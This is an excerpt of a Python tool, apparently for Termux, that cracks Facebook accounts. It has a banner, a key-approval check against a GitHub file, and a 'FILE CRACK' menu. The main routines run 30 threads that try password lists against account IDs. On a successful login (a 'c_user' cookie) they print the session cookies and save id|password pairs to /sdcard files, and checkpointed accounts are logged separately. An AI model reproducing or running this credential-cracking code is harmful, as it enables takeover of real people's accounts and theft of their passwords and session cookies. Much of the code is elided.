...
\033[1;31m▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\033[1;37m
 ...
 Version   : \033[1;32m V1 \033[1;37m
\033[1;31m▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\033[1;37m""")           
  print(f"Your Key : \033[1;32m"+id)                                
  print(f"\033[1;37mThis Tool Is  But You Need To Access This Tool")
  print(f"Send Your Key in facebook")
  os.system(f'xdg-open https://www.facebook.com/abegbalobasa.abegbalobasa')
  time.sleep(1)
  print(f"\033[1;37mChecking Your Key")
  try:
    httpCaht = requests.get(f"https://github.com/idatensho/KAMADH-VIP/blob/main/Approval.txt").text
    if id in httpCaht:
      ...
      os.system(f'https://www.facebook.com/profile.php?id=100084565670977'+id)
      time.sleep(1)
      sys.exit()
  except:
    sys.exit()
...
================================================
   \33[37;41m\t DASHAIN AAYO HATTI DHAL \33[0;m
=================================================""")
def linex():
        print(47*'\033[1;31m----------------------------------------------')
def clear():
...
def ckx():
	uuid = str(os.geteuid()) + str(os.getlogin())
	id = "᯾".join(uuid)
	server = requests.get(f'https://github.com/idatensho/KAMADH-VIP/blob/main/Approval.txt').text
	try:
		httpCaht = requests.get(f"https://github.com/idatensho/KAMADH-VIP/blob/main/Approval.txt").text
		if id in httpCaht:
			msg = str(os.geteuid())
...
def ARS():
	clear()
	#ckx()
	print(f" [\033[1;32m1\033[1;37m] FILE CRACK ")
	#print(f" [\033[1;32m2\033[1;37m] BD RANDOM CRACK ")
	...
	if me in ["1", "01","11","A","a"]:
		...
		with tred(max_workers=30) as crack_submit:
			...
			print(f' Total Account : \033[1;32m'+total_ids+f' \n \033[1;37mMethod Used : \033[1;32mM{mthd}\033[1;37m')
...
def m1(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write(f'\r\r\033[1;37m [ ARCEUS ] \033[1;36m•\033[1;37m %s \033[1;36m•\033[1;37m OK \033[1;36m•\033[1;37m [\033[1;32m%s\033[1;37m]'%(loop,len(oks)));sys.stdout.flush()
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        ARS=session.cookies.get_dict().keys()
                        if "c_user" in ARS:
                                coki=session.cookies.get_dict()
                                kuki = (f";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
                                print(f'\r\r\033[1;32m [OK] %s \033[1;36m✓\033[1;37m\033[1;32m %s'%(ids,pas))
                                #cek_apk(session,coki)
                                print(f'\033[1;36m [Cookie]\033[1;37m : '+coki)
                                open(f'/sdcard/ARS•OK•M1.txt', 'a').write(ids+'|'+pas+'\n')
                                oks.append(ids)
                                break
                        elif 'checkpoint' in ARS:
                                if 'y' in pcp:
                                        print(f'\r\r\x1b[38;5;208m [CP] '+ids+' • '+pas+'\033[1;97m')
                                        open(f'/sdcard/ARS•CP.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        if "c_user" in ARS:
                                ...
                                #cek_apk(session,coki)
                                #print(f'\033[1;36m [Cookie]\033[1;37m : '+coki)
                                open(f'/sdcard/ARS•OK•M3.txt', 'a').write(ids+'|'+pas+'\n')
                                oks.append(ids)
                                break
                        elif 'checkpoint' in ARS:
                                if 'y' in pcp:
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        if "c_user" in ARS:
                                ...
                                #cek_apk(session,coki)
                                #print(f'\033[1;36m [Cookie]\033[1;37m : '+coki)
                                open(f'/sdcard/ARS•OK•M2.txt', 'a').write(ids+'|'+pas+'\n')
                                oks.append(ids)
                                break
                        elif 'checkpoint' in ARS:
                                if 'y' in pcp:
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        if "c_user" in ARS:
                                ...
                                #cek_apk(session,coki)
                                print(f'\033[1;36m [Cookie]\033[1;37m : '+coki)
                                open(f'/sdcard/ARS•OK•M4.txt', 'a').write(ids+'|'+pas+'\n')
                                oks.append(ids)
                                break
                        elif 'checkpoint' in ARS:
                                if 'y' in pcp:
